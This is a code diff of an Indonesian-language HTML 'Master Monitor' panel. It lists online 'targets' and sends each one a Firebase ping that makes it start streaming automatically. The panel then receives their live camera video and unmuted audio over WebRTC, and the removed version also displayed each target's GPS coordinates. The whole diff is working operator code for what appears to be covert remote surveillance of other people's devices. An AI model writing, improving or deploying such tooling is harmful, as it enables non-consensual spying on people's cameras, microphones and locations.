@@ -2,34 +2,33 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <title>Master Auto-Monitor</title>
+    <title>Master Monitor v6</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
-        body { background: #000; color: #0f0; font-family: monospace; display: flex; margin: 0; height: 100vh; }
-        #list { width: 250px; border-right: 1px solid #0f0; padding: 10px; overflow-y: auto; }
-        #view { flex: 1; display: flex; flex-direction: column; padding: 20px; }
-        .target { border: 1px solid #0f0; padding: 10px; margin-bottom: 10px; cursor: pointer; }
-        .target.active { background: #040; }
-        #vid-box { width: 100%; flex: 1; background: #111; border: 2px solid #0f0; position: relative; }
+        body { background: #000; color: #00ff00; font-family: 'Courier New', monospace; margin: 0; display: flex; height: 100vh; }
+        #sidebar { width: 280px; border-right: 1px solid #00ff00; padding: 15px; overflow-y: auto; }
+        #content { flex: 1; padding: 20px; display: flex; flex-direction: column; }
+        .tgt-item { border: 1px solid #00ff00; padding: 10px; margin-bottom: 10px; cursor: pointer; border-radius: 4px; }
+        .tgt-item.active { background: #003300; box-shadow: 0 0 10px #00ff00; }
+        #video-container { flex: 1; background: #0a0a0a; border: 2px solid #00ff00; position: relative; border-radius: 8px; overflow: hidden; }
         video { width: 100%; height: 100%; object-fit: contain; }
-        #overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); 
-                   display: flex; justify-content: center; align-items: center; color: white; cursor: pointer; z-index: 10; }
+        #btn-start { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); 
+                     color: #00ff00; display: flex; align-items: center; justify-content: center; font-size: 20px; cursor: pointer; z-index: 100; }
         .hidden { display: none !important; }
     </style>
 </head>
 <body>
-    <div id="list">
-        <h3>LIST TARGET</h3>
-        <div id="targets"></div>
+    <div id="sidebar">
+        <h3>ACTIVE TARGETS</h3>
+        <div id="target-list">Menunggu target...</div>
     </div>
-    <div id="view">
-        <div id="vid-box">
-            <!-- Overlay untuk memicu suara (syarat browser) -->
-            <div id="overlay">KLIK DI SINI UNTUK AKTIFKAN MONITORING</div>
+    <div id="content">
+        <div id="video-container">
+            <div id="btn-start">KLIK UNTUK MENGAKTIFKAN PANEL</div>
             <video id="rv" autoplay playsinline></video>
         </div>
-        <p id="meta">Pilih target...</p>
+        <div id="info" style="margin-top:15px;">Pilih target untuk memulai monitoring otomatis.</div>
     </div>
 
     <script>
@@ -39,51 +38,54 @@
             projectId: "chatroom-e9b3f"
         };
         firebase.initializeApp(config);
-        const rootDb = firebase.database().ref('v5_multi');
+        const rootDb = firebase.database().ref('v6_sync');
 
-        let currentId = null;
+        let activeId = null;
         let pc = null;
-        let isActivated = false;
+        let isUserActive = false;
 
-        // Klik overlay untuk mengizinkan audio selamanya di sesi ini
-        document.getElementById('overlay').onclick = function() {
+        document.getElementById('btn-start').onclick = function() {
             this.classList.add('hidden');
-            isActivated = true;
+            isUserActive = true;
             document.getElementById('rv').play();
         };
 
+        // 1. List Target yang Online
         rootDb.on('value', snapshot => {
-            const cont = document.getElementById('targets');
-            cont.innerHTML = "";
+            const list = document.getElementById('target-list');
+            list.innerHTML = "";
             const data = snapshot.val();
             if (!data) return;
 
             Object.keys(data).forEach(id => {
                 const t = data[id];
-                if (Date.now() - t.status.lastSeen < 15000) {
-                    const d = document.createElement('div');
-                    d.className = "target " + (id === currentId ? 'active' : '');
-                    d.innerHTML = `ID: ${id}<br><small>LIVE</small>`;
-                    d.onclick = () => selectTarget(id);
-                    cont.appendChild(d);
-                    
-                    // AUTO-RECONNECT: Jika target yang sedang dilihat kirim offer baru (refresh)
-                    if (id === currentId && t.sdp && t.sdp.offer && t.sdp.offer.ts > (window.lastOfferTs || 0)) {
+                const isOnline = (Date.now() - (t.presence || 0)) < 10000;
+                
+                if (isOnline) {
+                    const el = document.createElement('div');
+                    el.className = `tgt-item ${id === activeId ? 'active' : ''}`;
+                    el.innerHTML = `ID: ${id}<br><small>STATUS: LIVE</small>`;
+                    el.onclick = () => selectTarget(id);
+                    list.appendChild(el);
+
+                    // AUTO-RESYNC: Jika target yang sedang aktif kirim offer baru
+                    if (id === activeId && t.sdp && t.sdp.offer && t.sdp.offer.ts > (window.lastOfferTs || 0)) {
                         window.lastOfferTs = t.sdp.offer.ts;
-                        connect(id, t.sdp.offer);
+                        handleOffer(id, t.sdp.offer);
                     }
                 }
             });
         });
 
-        async function connect(id, offer) {
+        async function handleOffer(id, offer) {
+            console.log("Menerima Offer, mengirim Answer...");
             if (pc) pc.close();
             pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
-            
+
             pc.ontrack = e => {
                 const rv = document.getElementById('rv');
                 rv.srcObject = e.streams[0];
-                if(isActivated) rv.muted = false;
+                if(isUserActive) rv.muted = false;
             };
 
             pc.onicecandidate = e => {
@@ -95,19 +97,30 @@
             await pc.setLocalDescription(answer);
             rootDb.child(id + '/sdp/answer').set({ type: answer.type, sdp: answer.sdp });
 
+            // Bersihkan listener ICE lama agar tidak duplikat
+            rootDb.child(id + '/ice_t').off();
             rootDb.child(id + '/ice_t').on('child_added', s => {
-                pc.addIceCandidate(new RTCIceCandidate(s.val()));
+                pc.addIceCandidate(new RTCIceCandidate(s.val())).catch(e=>{});
             });
         }
 
-        function selectTarget(id) {
-            currentId = id;
-            window.lastOfferTs = 0; // Trigger reconnection
-            rootDb.child(id + '/status').once('value', s => {
-                const d = s.val();
-                document.getElementById('meta').innerText = `Target: ${id} | Loc: ${d.lat}, ${d.lng}`;
-            });
+        async function selectTarget(id) {
+            if (activeId) {
+                // Beritahu target lama bahwa kita berhenti memantau
+                rootDb.child(activeId + '/monitor_ping').remove();
+            }
+            
+            activeId = id;
+            window.lastOfferTs = 0;
+            document.getElementById('info').innerText = `Menyambungkan ke ${id}...`;
+
+            // TRIGGER: Kirim 'ping' ke Firebase. Target akan melihat ini dan kirim Offer otomatis.
+            // Gunakan timestamp agar target tahu ini ping baru (akibat refresh monitor)
+            rootDb.child(id + '/monitor_ping').set(Date.now());
         }
+
+        // Jika Monitor di-refresh, saat dimuat ulang ia akan memilih target terakhir (jika ada)
+        // atau kita biarkan user memilih lagi untuk memastikan interaksi suara aktif.
     </script>
 </body>
 </html>
